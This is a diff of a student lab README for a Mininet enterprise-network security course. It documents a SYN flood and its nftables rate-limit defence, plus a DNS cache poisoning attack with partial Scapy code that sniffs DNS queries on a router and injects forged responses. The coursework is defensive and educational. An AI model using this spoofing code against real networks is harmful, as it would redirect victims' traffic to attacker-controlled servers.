@@ -4,11 +4,21 @@
 Deroeux Elric (noma:)
 Lévêque Quentin (noma:)
 
+## Files
+- The mininet topology -> `~/LINFO2347/topo.py`
+- A folder containing our attack script -> `~/LINFO2347/attacks/`
+- A folder containing our protection scripts -> `~/LINFO2347/protections/`
+- A README -> `~/LINFO2347/README.md`
+- A set of slide -> TODO
+
 ## Basic enterprise network protection
 For the basic entreprise network protection we tried to keep our NFT super simplified.
 
 - No statement have been made for routers behavior, we allow them to send/receive ping/connection.
 - Routers forward behavior is "default drop" as it is a good practice
+
+## Launch attacks/protections
+
 
 ### r1 NFTable:
 ```
@@ -62,6 +72,7 @@ table inet filter {
 ```
 - r2 need to allow packets from workstations IPs only.
 - Everything from internet can come in because of r1 drop policy that will block packet not destinated to DMZ.
+
 ### Application of rules:
 We modified the topo.py to apply our basic NFTables to r1 and r2.
 ```python
@@ -75,85 +86,6 @@ def apply_nftables_rules(net: Mininet) -> None:
 ...
 ```
 We call this function after the `add_routes` function.
-
-
-## DNS Cache Poisoning
-
-### Attack
-This script manage `r1` to intercept DNS requests from the workstations (`ws2` and `ws3`) and spoof the DNS response. By doing so, it aim to poison the DNS cache with a forged IP address (`1.2.3.4`) configurable, redirecting future requests for that domain (`example.com`) to a malicious server.
-We use `example.com` due to the configuration of the DNS server that associate `example.com` to the IP adress `192.0.2.192` as it's specified in the dnsmasq config `address=/example.com/192.0.2.192`
-
-#### Config
-```
-TARGET_DOMAIN = b"example.com."
-FAKE_IP = "1.2.3.4"
-DNS_PORT = 5353
-```
-#### Sniffing
-`r1` start sniffing all the DNS packet that go through `r1-eth0` and start to anaylze them.
-```python
-from scapy.all import *
-...
-print(f"Listening for DNS queries on port {DNS_PORT}...")
-sniff(filter=f"udp port {DNS_PORT}", iface="r1-eth0", prn=spoof_dns, store=0)
-```
-#### Filtering
-It drop the packet that are not query and that are not asking about the domain `example.com`
-```python
-    ...
-    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
-        qname = pkt[DNSQR].qname
-    else:
-        return
-        
-    if qname != TARGET_DOMAIN:
-        return
-        
-    print(f"{qname.decode()} found, spoofing DNS response ...")
-    ...
-```
-#### Spoofing
-It use informations of intercepted packet to build a credible response. 
-It invert source and destination IPs and ports, it use the same ID request and use the fake ip adress.
-Then it send the spoofed packet that should come before the DNS response.
-```python
-...
-    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
-    udp = UDP(dport=pkt[UDP].sport, sport=DNS_PORT)
-    dns = DNS(
-        id=pkt[DNS].id,
-        qr=1,
-        aa=1,
-        qd=pkt[DNS].qd,
-        an=DNSRR(rrname=qname, ttl= 300,rdata=FAKE_IP)
-    )
-    spoofed_pkt = ip / udp / dns
-    send(spoofed_pkt, verbose=0)
-    print(f"Spoofed packet sent with ip {FAKE_IP}")
-...
-```
-#### Perform the attack
-On `r1` execute the script `python3 ~/LINFO2347/attacks/dns_cache_poisoning/main.py`
-Then on `ws2`OR/AND `ws3` perform a DNS query to the DNS server asking for example.com `dig @10.12.0.20 -p 5353 example.com +short`
-#### Result
-Based on the DNS response of the `dig` command
-Either `192.0.2.192` if the attack missed or `1.2.3.4` if it worked
-
-#### Limitation
-We are aware that the DNS cache poisoning could have been performed on the DNS instead on the Workstation, that would have impacted all the network and be more persistant. 
-The step would have been similar but the sniff would have to be on r2 to intercept our DNS server request.
-
-### Protection
-Since the attack is timed, `related/established` rule wont work. 
-Neither for `ip saddr 10.12.0.20` or `sport 5353` due to the spoofing.
-Default drop on `r1` output doesn't seems to work due to spoofing.
-
-Allowing dnssec in the `/etc/dnsmasq.conf` could protect.
-
-In a normal environement it would be very hard to assemble right timing, right ID and right port as it could be randomise too.
-In one of these condition not proprelly done we could block the attack using an nftable.
-
-(Or surely is it possible but we didnt found the way to do it).
 
 ## Network Port Scan (TCP)
 
@@ -273,12 +205,117 @@ Failed: porsche
 Traceback (most recent call last):
 ```
 
-## Syn flood
+## SYN Flood Attack
 
 ### Attack
+This attack aims to simulate a TCP SYN flood from the `internet` host targeting the HTTP server at `10.12.0.10`. The goal is to saturate the server with half-open TCP connections, which can prevent legitimate users from establishing real HTTP sessions.
 
-#### Limitations
 
 #### Result
 
+![Impact of syn flood](images/flood_impact.png)
+As shown on screen during our tests, the SYN flood caused a significant increase in response time for legitimate clients. Before the attack, HTTP requests were typically served in **under 0.01 seconds**. However, under SYN flood conditions, response times varied **between 0.3 and 1 second**, with rare peaks reaching **up to 10 seconds**.
+
+```
+ss -ant state SYN-RECV
+```
+![SYN-RECV connections before protection](images/syn_recv.png)
+This command displays all TCP sockets that are in the middle of a handshake — that is, the server has received a SYN and sent back a SYN-ACK, but is still waiting for the final ACK from the client. This is a clear indication of a SYN flood.
+
 ### Protection
+
+To mitigate the SYN flood attack on the HTTP server (`10.12.0.10`), we deployed a rule that rate-limits new incoming TCP connections on port 80 based on SYN packets:
+
+```nft
+tcp dport 80 ct state new tcp flags & syn == syn limit rate over 6/second burst 3 packets counter drop
+```
+
+This rule instructs the firewall to monitor new TCP connections (SYN packets) to port 80. If an IP sends more than 6 SYN packets per second, the excess packets are dropped. The counter keyword logs each dropped attempt for debugging or statistics.
+
+
+After applying this rule, we observed a significant reduction in the impact of the SYN flood:
+
+- No more half-open connections were visible in the SYN-RECV state.
+- The attacker’s Scapy flood script still sent packets, but the server silently dropped them.
+
+In other words, the SYN flood no longer had any measurable effect on service availability, despite the flood traffic continuing in the background.
+
+## DNS Cache Poisoning
+
+### Attack
+This script manage `r1` to intercept DNS requests from the workstations (`ws2` and `ws3`) and spoof the DNS response. By doing so, it aim to poison the DNS cache with a forged IP address (`1.2.3.4`) configurable, redirecting future requests for that domain (`example.com`) to a malicious server.
+We use `example.com` due to the configuration of the DNS server that associate `example.com` to the IP adress `192.0.2.192` as it's specified in the dnsmasq config `address=/example.com/192.0.2.192`
+
+#### Config
+```
+TARGET_DOMAIN = b"example.com."
+FAKE_IP = "1.2.3.4"
+DNS_PORT = 5353
+```
+#### Sniffing
+`r1` start sniffing all the DNS packet that go through `r1-eth0` and start to anaylze them.
+```python
+from scapy.all import *
+...
+print(f"Listening for DNS queries on port {DNS_PORT}...")
+sniff(filter=f"udp port {DNS_PORT}", iface="r1-eth0", prn=spoof_dns, store=0)
+```
+#### Filtering
+It drop the packet that are not query and that are not asking about the domain `example.com`
+```python
+    ...
+    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
+        qname = pkt[DNSQR].qname
+    else:
+        return
+        
+    if qname != TARGET_DOMAIN:
+        return
+        
+    print(f"{qname.decode()} found, spoofing DNS response ...")
+    ...
+```
+#### Spoofing
+It use informations of intercepted packet to build a credible response. 
+It invert source and destination IPs and ports, it use the same ID request and use the fake ip adress.
+Then it send the spoofed packet that should come before the DNS response.
+```python
+...
+    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+    udp = UDP(dport=pkt[UDP].sport, sport=DNS_PORT)
+    dns = DNS(
+        id=pkt[DNS].id,
+        qr=1,
+        aa=1,
+        qd=pkt[DNS].qd,
+        an=DNSRR(rrname=qname, ttl= 300,rdata=FAKE_IP)
+    )
+    spoofed_pkt = ip / udp / dns
+    send(spoofed_pkt, verbose=0)
+    print(f"Spoofed packet sent with ip {FAKE_IP}")
+...
+```
+#### Perform the attack
+On `r1` execute the script `python3 ~/LINFO2347/attacks/dns_cache_poisoning/main.py`
+Then on `ws2`OR/AND `ws3` perform a DNS query to the DNS server asking for example.com `dig @10.12.0.20 -p 5353 example.com +short`
+#### Result
+Based on the DNS response of the `dig` command
+Either `192.0.2.192` if the attack missed or `1.2.3.4` if it worked
+
+#### Limitation
+We are aware that the DNS cache poisoning could have been performed on the DNS instead on the Workstation, that would have impacted all the network and be more persistant. 
+The step would have been similar but the sniff would have to be on r2 to intercept our DNS server request.
+
+### Protection
+Since the attack is timed, `related/established` rule wont work.
+Neither for `ip saddr 10.12.0.20` or `sport 5353` due to the spoofing.
+Default drop on `r1` output doesn't seems to work due to spoofing.
+
+Allowing dnssec in the `/etc/dnsmasq.conf` could protect.
+
+In a normal environement it would be very hard to assemble right timing, right ID and right port as it could be randomise too.
+In one of these condition not proprelly done we could block the attack using an nftable.
+
+(Or surely is it possible but we didnt found the way to do it).
+
+
